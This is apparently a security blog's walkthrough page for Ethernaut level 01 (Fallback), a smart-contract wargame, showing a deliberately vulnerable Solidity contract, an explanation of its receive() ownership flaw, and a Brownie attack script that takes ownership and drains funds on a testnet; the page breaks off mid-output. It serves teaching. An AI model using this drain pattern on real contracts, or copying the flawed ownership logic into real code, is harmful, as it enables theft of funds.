@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <link rel="icon" href="/favicon.ico">
+
+  <title>
+    Ethernaut - Level 01 - Fallback - Security Pills
+  </title>
+
+  <meta name="description" content="Image courtesy of OpenZeppelin
+Ethernaut 01 - Fallback The first level from Ethernaut is pretty straightforward and we will use it to become familiar with some Solidity concepts and the Brownie framework that we will use to complete this challenge.
+The code for the smart contract that we must exploit is shown above:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallback { using SafeMath for uint256; mapping(address =&gt; uint) public contributions; address payable public owner; constructor() public { owner = msg." /><meta name="generator" content="Hugo 0.101.0" />
+
+  <link rel="stylesheet" href="https://securitypills.github.io/css/main.css" />
+
+  
+  
+
+  <meta property="og:title" content="Ethernaut - Level 01 - Fallback" />
+<meta property="og:description" content="Image courtesy of OpenZeppelin
+Ethernaut 01 - Fallback The first level from Ethernaut is pretty straightforward and we will use it to become familiar with some Solidity concepts and the Brownie framework that we will use to complete this challenge.
+The code for the smart contract that we must exploit is shown above:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallback { using SafeMath for uint256; mapping(address =&gt; uint) public contributions; address payable public owner; constructor() public { owner = msg." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://securitypills.github.io/articles/ethernaut-1-fallback/" /><meta property="article:section" content="articles" />
+<meta property="article:published_time" content="2022-08-02T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-08-02T00:00:00+00:00" />
+
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Ethernaut - Level 01 - Fallback"/>
+<meta name="twitter:description" content="Image courtesy of OpenZeppelin
+Ethernaut 01 - Fallback The first level from Ethernaut is pretty straightforward and we will use it to become familiar with some Solidity concepts and the Brownie framework that we will use to complete this challenge.
+The code for the smart contract that we must exploit is shown above:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallback { using SafeMath for uint256; mapping(address =&gt; uint) public contributions; address payable public owner; constructor() public { owner = msg."/>
+
+
+  <meta itemprop="name" content="Ethernaut - Level 01 - Fallback">
+<meta itemprop="description" content="Image courtesy of OpenZeppelin
+Ethernaut 01 - Fallback The first level from Ethernaut is pretty straightforward and we will use it to become familiar with some Solidity concepts and the Brownie framework that we will use to complete this challenge.
+The code for the smart contract that we must exploit is shown above:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallback { using SafeMath for uint256; mapping(address =&gt; uint) public contributions; address payable public owner; constructor() public { owner = msg."><meta itemprop="datePublished" content="2022-08-02T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-08-02T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1480">
+<meta itemprop="keywords" content="" />
+
+  <meta itemprop="name" content="Ethernaut - Level 01 - Fallback">
+<meta itemprop="description" content="Image courtesy of OpenZeppelin
+Ethernaut 01 - Fallback The first level from Ethernaut is pretty straightforward and we will use it to become familiar with some Solidity concepts and the Brownie framework that we will use to complete this challenge.
+The code for the smart contract that we must exploit is shown above:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallback { using SafeMath for uint256; mapping(address =&gt; uint) public contributions; address payable public owner; constructor() public { owner = msg."><meta itemprop="datePublished" content="2022-08-02T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-08-02T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1480">
+<meta itemprop="keywords" content="" />
+</head><body class="flex relative h-full min-h-screen"><aside
+  class="will-change-transform transform transition-transform -translate-x-full absolute top-0 left-0 md:relative md:translate-x-0 w-3/4 md:w-60 h-full min-h-screen p-3 bg-slate-50 dark:bg-slate-800 border-r border-slate-200 dark:border-slate-700 flex flex-col gap-2.5 z-20 sidebar">
+  <p class="font-bold mb-5 flex items-center gap-2">
+    <button
+      aria-label="Close sidebar"
+      class="md:hidden menu-trigger-close p-1 rounded text-slate-800 dark:text-slate-50 hover:bg-slate-200 dark:hover:bg-slate-700"><svg class="h-6 w-6" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <line x1="18" y1="6" x2="6" y2="18" />
+  <line x1="6" y1="6" x2="18" y2="18" />
+</svg></button>
+    <a href="https://securitypills.github.io/" class="px-2">
+    <span>Security Pills</span>
+    
+    </a>
+    
+    <button
+      aria-label="Toggle dark mode"
+      class="dark-mode-toggle p-2 rounded border dark:border-slate-700 hover:bg-slate-200 dark:hover:bg-slate-700"><svg class="h-4 w-4" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <circle cx="12" cy="12" r="4" />
+  <path d="M3 12h1M12 3v1M20 12h1M12 20v1M5.6 5.6l.7 .7M18.4 5.6l-.7 .7M17.7 17.7l.7 .7M6.3 17.7l-.7 .7" />
+</svg></button>
+  
+  </p>
+
+  
+  <ul class="list-none flex flex-col gap-1">
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/" >
+        <span>Home</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/articles" >
+        <span>Blog</span>
+        
+      </a>
+    </li>
+    
+    <li>
+      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/portfolio" >
+        <span>Newsletter</span>
+        
+      </a>
+    </li>
+    
+  </ul>
+
+  <div class="flex-1"></div>
+
+  <div class="revue-widget">
+  <form action="https://embeds.beehiiv.com/3645f86f-e3bb-46cb-adec-b3b2f20c9411?slim=true" method="post" name="revue-form" target="_blank">
+    <div class="text-bold text-sm">Subscribe to my newsletter</div>
+    
+    <p class="text-xs my-1 text-slate-500">A weekly newsletter for smart and curious people interested in security, technology, and smartcontracts</p>
+    
+    <div class="mt-2">
+      <input type="email" class="w-full px-1.5 py-0.5 text-sm rounded border dark:border-slate-700 dark:bg-slate-600" name="member[email]" id="member_email" placeholder="Your email address...">
+      <input type="submit" class="mt-2 w-full text-center text-sm bg-slate-800 text-white dark:bg-slate-50 dark:text-slate-800 py-1 rounded" name="member[subscribe]" id="member_submit" value="Subscribe">
+    </div>
+  </form>
+</div>
+
+  <ul class="list-none flex flex-wrap justify-center gap-1 pt-2 border-t border-slate-200 dark:border-slate-600">
+    
+  </ul>
+</aside>
+
+<div
+  class="fixed bg-slate-700 bg-opacity-5 transition duration-200 ease-in-out inset-0 z-10 pointer-events-auto md:hidden left-0 top-0 w-full h-full hidden menu-overlay">
+</div>
+
+<button
+  aria-label="Toggle Sidebar"
+  class="md:hidden absolute top-3 left-3 z-10 menu-trigger p-1 rounded text-slate-800 dark:text-slate-50 hover:bg-slate-100"><svg class="h-6 w-6" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
+  fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" />
+  <line x1="4" y1="6" x2="20" y2="6" />
+  <line x1="4" y1="12" x2="20" y2="12" />
+  <line x1="4" y1="18" x2="16" y2="18" />
+</svg></button><div class="flex-1">
+
+
+
+<div class="flex h-screen relative">
+
+  <section
+    class="will-change-transform transform transition-transform -translate-x-[200%] absolute top-0 left-0 lg:relative
+  lg:translate-x-0 lg:min-w-[400px] lg:w-1/4 h-full bg-slate-50 dark:bg-slate-800 border-r border-slate-200 dark:border-slate-700 lg:flex flex-col py-3 overflow-y-auto scroll-area">
+    
+    
+    <a href="https://securitypills.github.io/articles/">
+      <h2 class="font-bold mb-5 py-1 pl-12 pr-3 md:px-3">Articles</h2>
+    </a>
+    <div class="space-y-2.5">
+      
+      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
+        href="/articles/ethernaut/">
+        
+        
+        <h3 class="text-lg font-semibold mb-0.5">Ethernaut Challenges</h3>
+        <div
+          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
+          Ethernaut is OpenZeppelin Web3/Solidity based wargame to learn about Ethereum smart contract security and become familiar with programming principles in Solidity.
+Although the game was launched few years ago it has become a good place to start for those who are interested on security and smart contracts.
+Challenges are currently running on the Rinkeby testnet and you will require to use a Rinkey Faucet to get free testnet ETH and test the smart contracts.
+        </div>
+      </a>
+      
+      <a class="block px-3 py-4  bg-slate-900 dark:bg-slate-700 text-slate-50 "
+        href="/articles/ethernaut-1-fallback/">
+        
+        
+        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 01 - Fallback</h3>
+        <div
+          class="text-sm  text-slate-400  line-clamp-2">
+          Image courtesy of OpenZeppelin
+Ethernaut 01 - Fallback The first level from Ethernaut is pretty straightforward and we will use it to become familiar with some Solidity concepts and the Brownie framework that we will use to complete this challenge.
+The code for the smart contract that we must exploit is shown above:
+// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallback { using SafeMath for uint256; mapping(address =&gt; uint) public contributions; address payable public owner; constructor() public { owner = msg.
+        </div>
+      </a>
+      </div>
+    </section>
+
+  <div class="overflow-y-auto h-screen w-full">
+    <article class="px-6 py-20 w-full mx-auto prose lg:prose-lg h-fit dark:prose-invert prose-img:mx-auto">
+
+      
+      <h1 class="!mb-2">Ethernaut - Level 01 - Fallback</h1>
+      
+      <p class="text-sm text-slate-500 !mb-8">August 2, 2022</p>
+      
+
+      
+
+      <figure><img src="../images/fallback-1.svg"
+         alt="Image courtesy of OpenZeppelin"/><figcaption>
+            <p><em>Image courtesy of OpenZeppelin</em></p>
+        </figcaption>
+</figure>
+
+<h2 id="ethernaut-01---fallback">Ethernaut 01 - Fallback</h2>
+<p>The first level from Ethernaut is pretty straightforward and we will use it to become familiar with some Solidity concepts and the Brownie framework that we will use to complete this challenge.</p>
+<p>The code for the smart contract that we must exploit is shown above:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Fallback</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">using</span> SafeMath <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">uint256</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">mapping</span>(<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">uint</span>) <span style="color:#66d9ef">public</span> contributions;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> owner;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>() <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    owner <span style="color:#f92672">=</span> msg.sender;
+</span></span><span style="display:flex;"><span>    contributions[msg.sender] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1</span> <span style="color:#66d9ef">ether</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">modifier</span> <span style="color:#a6e22e">onlyOwner</span> {
+</span></span><span style="display:flex;"><span>        require(
+</span></span><span style="display:flex;"><span>            msg.sender <span style="color:#f92672">==</span> owner,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;caller is not the owner&#34;</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">_</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">contribute</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+</span></span><span style="display:flex;"><span>    require(msg.value <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">001</span> <span style="color:#66d9ef">ether</span>);
+</span></span><span style="display:flex;"><span>    contributions[msg.sender] <span style="color:#f92672">+=</span> msg.value;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(contributions[msg.sender] <span style="color:#f92672">&gt;</span> contributions[owner]) {
+</span></span><span style="display:flex;"><span>      owner <span style="color:#f92672">=</span> msg.sender;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getContribution</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> contributions[msg.sender];
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>() <span style="color:#66d9ef">public</span> onlyOwner {
+</span></span><span style="display:flex;"><span>    owner.transfer(<span style="color:#66d9ef">address</span>(this).balance);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  receive() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {
+</span></span><span style="display:flex;"><span>    require(msg.value <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> contributions[msg.sender] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    owner <span style="color:#f92672">=</span> msg.sender;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>If we want to solve this level, we must claim the contract&rsquo;s ownership and reduce its balance to 0. Before diving deep into solving this contract, lets briefly explain the <code>fallback</code> concept and what&rsquo;s the takeaway from this contract:</p>
+<p>A <code>fallback</code> function basically lets a smart contract receive Ether from other contracts and wallets. If no fallback or known payable function has been defined, a smart contract can only receives Ether as a mining bonud or as the backup wallet of another contract that has self-destructed.</p>
+<p>The security problem in this contract is located in the <code>receive</code> function, and the logic implemented within it, which is used to change the contract&rsquo;s ownership after specific requirements are meet.</p>
+<p>It is important to understand that a fallback function can be called if:</p>
+<ul>
+<li>We first call a <strong>function that does not exist</strong> in the contract.</li>
+<li>We call a function <strong>without providing the required data</strong>.</li>
+<li>We send <strong>Ether without any data</strong> to the contract.</li>
+</ul>
+<p>In this particular contract, there are two paths to become the contract&rsquo;s owner. The first option is by sending 1000 Ether to the contract and trigger the <code>payable</code> function, but this would require hours until we can accumulate such amount through a Rinkey Faucet.</p>
+<p>The other ooption is to use the <code>fallback</code> function, although we first need to meet the following criteria:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>require(msg.value <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> contributions[msg.sender] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>),
+</span></span></code></pre></div><p>This requires to have donated before to the contract and the winning fallback function call needs to contain some Ether value.</p>
+<h2 id="analyzing-the-contract">Analyzing the contract</h2>
+<p>As this is our first Ethernaut challenge, lets analyze in details the source code and provide a walkthrough. Our first stop will be the <code>contribute</code> method, which has the following definition:</p>
+<div class="highlight" lineos="table" lineofstart="25"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex; background-color:#3c3d38"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">contribute</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    require(msg.value <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">001</span> <span style="color:#66d9ef">ether</span>);
+</span></span><span style="display:flex;"><span>    contributions[msg.sender] <span style="color:#f92672">+=</span> msg.value;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(contributions[msg.sender] <span style="color:#f92672">&gt;</span> contributions[owner]) {
+</span></span><span style="display:flex;"><span>      owner <span style="color:#f92672">=</span> msg.sender;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>The first statement uses <code>require</code> which will check if a condition is true, in this case it will check if the value submitted with the transaction is minor than 0.001 ether.</p>
+<p>If the condition is true, the method will continue its execution, otherwise it will throw an exception, causing the whole execution to stop and revert its status.</p>
+<p>The following statement is an update to the <code>contributions</code> map, which will include the address of the user that calls this method with the respective value that was sent, incrementing the overall value, as shown below:</p>
+<div class="highlight" lineos="table" lineofstart="26"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex; background-color:#3c3d38"><span> contributions[msg.sender] <span style="color:#f92672">+=</span> msg.value;
+</span></span></code></pre></div><p>Last but not least, there is an additional condition that checks if the value transferred by the current caller is greater than the value given by the owner of the contract during the deployment process (1000 ether). If true, the current caller will become the new owner of the contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(contributions[msg.sender] <span style="color:#f92672">&gt;</span> contributions[owner]) {
+</span></span><span style="display:flex;"><span>      owner <span style="color:#f92672">=</span> msg.sender;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>The <code>contribute</code> method contains one of the vulnerabilities introduced in this contract, however, reaching out that quantity of Ethers will take too much time, therefore, we will not follow this path.</p>
+<p>The next method available is <code>getContributions</code>, which returns the total value of total contributions made by whoever is calling the function, as shown below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getContribution</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> contributions[msg.sender];
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The next method is the <code>withdraw</code> one, which uses the <code>onlyOwner</code> modifier, therefore only those users whose address is stored in the <code>owner</code> state variable can call this function, otherwise, the execution will fail:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>() <span style="color:#66d9ef">public</span> onlyOwner {
+</span></span><span style="display:flex;"><span>    owner.transfer(<span style="color:#66d9ef">address</span>(this).balance);
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>The purpose that this function serves is to transfer all the balance associated with this contract to the address stored in the <code>owner</code> state variable. That means that the contract’s owner can call this function at any time and transfer all the funds in the contract to his address.</p>
+<p>Last but not least, there is the <code>receive</code> function. This is a special function in Solidity which allows us to send money to the contract, since behaves as a <code>fallback</code> function. Notwithstanding, this function cannot have arguments, cannot return anything and must have <code>external</code> visibility and <code>payable</code> state mutability:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>  receive() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {
+</span></span><span style="display:flex;"><span>    require(msg.value <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> contributions[msg.sender] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    owner <span style="color:#f92672">=</span> msg.sender;
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>According to Solidity’s documentation:</p>
+<blockquote>
+<p>The <code>receive</code> function is executed on a call to the contract with empty calldata. This is the function that is executed on plain Ether transfers. If no such function exists, but a payable fallback function exists, the fallback function will be called on a plain Ether transfer. If neither a <code>receive</code> Ether nor a <code>payable</code> fallback function is present,  the contract cannot receive Ether through regular transactions and throws an exception</p>
+</blockquote>
+<p>In this case, the <code>receive</code> function has a <code>require</code> statement, which demands:</p>
+<ul>
+<li>To have contributed Ether from the account address to the contract in the past.</li>
+<li>The function call needs to have some Ether value.</li>
+</ul>
+<p>If these two conditions are met, the contract’s owner will change and an attacker could potentially take control over it, transferring all the funds available and reducing the contract’s balance to 0.</p>
+<h2 id="hacking-the-contract">Hacking the contract</h2>
+<p>There are different ways to exploit this vulnerability, but we are going to focus on using the <a href="https://eth-brownie.readthedocs.io/en/stable/"  target="_blank" rel="noopener" >Brownie framework</a>, a development and testing framework for smart contracts targeting the EVM.</p>
+<p>Our first step will be to get some test ether through a <a href="https://rinkebyfaucet.com/"  target="_blank" rel="noopener" >Rinkeby faucet</a>.</p>
+<p>After this, we will create a brownie project and define an interface. <strong>Interfaces</strong> are used to call functiosn from another contract in your newly deployed contract. For this interface we will declare the <code>owner()</code>, <code>contribute()</code> and <code>withdraw()</code> methods:</p>
+<div class="highlight" lineos="table" lineofstart="1"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IFallback</span> {
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">owner</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span>(<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span>);
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">contribute</span>() <span style="color:#66d9ef">external</span>;
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>() <span style="color:#66d9ef">external</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>On the other hand, the proof of concept that will be used to drain the contract’s funds and become its owner :</p>
+<div class="highlight" lineos="table" lineofstart="1"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#66d9ef">from</span> brownie <span style="color:#f92672">import</span> accounts, config, <span style="color:#66d9ef">interface</span>, web3, Fallback
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def attack(target, hacker)<span style="color:#f92672">:</span>
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    fallback <span style="color:#f92672">=</span> <span style="color:#66d9ef">interface</span>.IFallback(target)
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span> to ensure that contributions[hacker] will be greater than <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    fallback.contribute({<span style="color:#e6db74">&#39;from&#39;</span><span style="color:#f92672">:</span> hacker, <span style="color:#e6db74">&#39;amount&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;0.0005 ether&#39;</span>})
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span> call <span style="color:#e6db74">&#39;receive&#39;</span> 
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    hacker.transfer(to<span style="color:#f92672">=</span>target, amount<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.001 ether&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(f<span style="color:#e6db74">&#34;Owner is hacker: {fallback.owner() == hacker.address}&#34;</span>)
+</span></span><span style="display:flex; background-color:#3c3d38"><span>    fallback.withdraw({<span style="color:#e6db74">&#39;from&#39;</span><span style="color:#f92672">:</span> hacker})
+</span></span><span style="display:flex;"><span>    print(f<span style="color:#e6db74">&#34;Final contract balance: {web3.eth.getBalance(target)}&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def main(target)<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#960050;background-color:#1e0010">#</span> Obtain the attacker<span style="color:#e6db74">&#39;s wallet address from the .env file</span>
+</span></span><span style="display:flex;"><span>    hacker <span style="color:#f92672">=</span> accounts.add(config[<span style="color:#e6db74">&#39;wallets&#39;</span>][<span style="color:#e6db74">&#39;from_key&#39;</span>])
+</span></span><span style="display:flex;"><span>    attack(target, hacker)
+</span></span></code></pre></div><p>Our main function starts using the <code>accounts.add</code> method, used to recover our account (where the funds are going to be transferred) using the private key specified in the <code>.env</code> file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>hacker <span style="color:#f92672">=</span> accounts.add(config[<span style="color:#e6db74">&#39;wallets&#39;</span>][<span style="color:#e6db74">&#39;from_key&#39;</span>])
+</span></span></code></pre></div><p>After this, a call to the <code>attack</code> method providing as arguments the address for the contract that we want to attack and the address for our contract is performed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>attack(target, hacker)
+</span></span></code></pre></div><p>Our attack function will be divided into three steps:</p>
+<ol>
+<li>Perform a contribution to the contract for less than 0.001 ether. This will help meet the requirements defined in the contract’s <code>receive</code> function.</li>
+<li>Perform a call to the <code>receive</code> method through <code>hacker.transfer</code>. Which will meet the condition as the amount transferred will be greater than <code>0</code> and our contract has done a previous contribution in the step before. This will immediately make us owners of the contract.</li>
+<li>Last step is to withdraw the funds associated to the contract, as we are now the legitimate owner.</li>
+</ol>
+<p>Last but not least, the script can be executed through the <code>brownie run</code> command, successfully hacking the first level of the Ethernaut challenge, as shown below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@vmi828562 ~/r/e/f/scripts#
+</span></span><span style="display:flex;"><span>brownie run attack main <span style="color:#e6db74">&#34;0xfb6EFDB9bE117904a9E9eFF7Fcf6E2cff9BC781f&#34;</span> --network rinkeby
+</span></span><span style="display:flex;"><span>Brownie v1.18.1 - Python development framework <span style="color:#66d9ef">for</span> Ethereum
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Running <span style="color:#e6db74">&#39;attack.py::main&#39;</span>...
+</span></span><span style="display:flex;"><span>Transaction sent: 0x56e5062c600e5b9d9fac22ce4333c7b32a0e4737bb2dcf646a304a9b9f8e1aef
+</span></span><span style="display:flex;"><span>  Gas price: 2.654972458 gwei   Gas limit: <span style="color:#ae81ff">31803</span>   Nonce: <span style="color:#ae81ff">16</span>
